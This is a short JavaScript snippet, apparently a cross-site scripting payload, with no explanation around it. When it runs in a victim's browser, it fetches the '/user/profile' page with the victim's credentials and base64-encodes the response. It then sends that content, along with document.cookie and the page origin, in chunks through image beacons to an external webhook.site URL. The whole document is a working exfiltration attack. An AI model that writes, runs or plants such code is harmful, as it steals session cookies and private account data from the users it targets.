(async () => {
  const WEBHOOK = 'https://webhook.site/12a35676-d3a6-40e5-998b-f053b949ecbf';
  const beacon = (params) => {
    const img = new Image();
    img.src = WEBHOOK + '?' + params + '&t=' + Date.now();
  };
  try {
    beacon('stage=start&origin=' + encodeURIComponent(location.origin));
    const r = await fetch('/user/profile', { credentials: 'include' });
    const body = await r.text();
    const b64 = btoa(unescape(encodeURIComponent(body)));
    beacon('stage=meta&status=' + r.status + '&len=' + body.length +
           '&cookies=' + encodeURIComponent(document.cookie));
    const CHUNK = 1500;
    const total = Math.ceil(b64.length / CHUNK);
    beacon('stage=chunks&total=' + total + '&b64len=' + b64.length);
    for (let i = 0; i < total; i++) {
      const slice = b64.slice(i * CHUNK, (i + 1) * CHUNK);
      beacon('stage=data&i=' + i + '&n=' + total +
             '&d=' + encodeURIComponent(slice));
    }
    beacon('stage=done');
  } catch (e) {
    beacon('stage=error&msg=' + encodeURIComponent(String(e && e.message || e)));
  }
})();
